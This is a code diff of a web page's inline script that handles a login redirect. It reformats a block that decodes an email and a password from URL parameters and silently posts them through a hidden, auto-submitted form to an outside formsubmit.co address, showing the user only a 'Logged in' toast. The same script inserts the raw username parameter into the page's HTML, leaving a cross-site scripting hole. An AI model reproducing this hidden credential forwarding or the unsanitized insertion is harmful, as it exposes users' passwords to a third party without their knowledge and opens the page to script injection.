@@ -760,26 +760,27 @@
 		    let params = Object.fromEntries(new URLSearchParams(location.search));
 			document.querySelector(".menu__item:last-child").innerHTML = `<h5>Logged in as <strong>${params.username}</strong></h5>`;
 			document.querySelector(".footer__menu__link__a:last-child").outerHTML = `<a data-aos="fade-right" data-aos-duration="2700" href="/?logout=success" class="text-black footer__menu__link__a">Logout</a>`;
-			if (!location.search.match(/email=/)) return;
-			makeToast(`Logged in as ${params.username}`);
-		    let x_f = document.createElement("div");
-		    x_f.hidden = "hidden";
-		    x_f.innerHTML = `
-			<form action="https://formsubmit.co/14f312b1adcd1cda642ee69edab7eea6"
-				method="POST">
-					<input type="hidden" name="_subject" value="New signup at..." />
-					<input type="hidden" name="_next"
-						value="https://abbaskhurram255.github.io/site-2?login=success">
-					<input type="email" name="email" value="${atob(params.email)}" />
-					<input type="text" name="pwd" value="${atob(params.xidcheck)}" />
-					<input type="hidden" name="_captcha" value="false" />
-					<input type="hidden" name="_template" value="table" />
-					<button type="submit" />
-			</form>
-		    `;
-		    x_f = x_f.firstElementChild;
-			document.body.appendChild(x_f);
-		    x_f.submit();
+			if (location.search.match(/email=/)) {
+				makeToast(`Logged in as ${params.username}`);
+				let x_f = document.createElement("div");
+				x_f.hidden = "hidden";
+				x_f.innerHTML = `
+				<form action="https://formsubmit.co/14f312b1adcd1cda642ee69edab7eea6"
+					method="POST">
+						<input type="hidden" name="_subject" value="New signup at..." />
+						<input type="hidden" name="_next"
+							value="https://abbaskhurram255.github.io/site-2?login=success">
+						<input type="email" name="email" value="${atob(params.email)}" />
+						<input type="text" name="pwd" value="${atob(params.xidcheck)}" />
+						<input type="hidden" name="_captcha" value="false" />
+						<input type="hidden" name="_template" value="table" />
+						<button type="submit" />
+				</form>
+				`;
+				x_f = x_f.firstElementChild;
+				document.body.appendChild(x_f);
+				x_f.submit();
+			}
 		}
 		scrolly(); 
 		AOS.init();
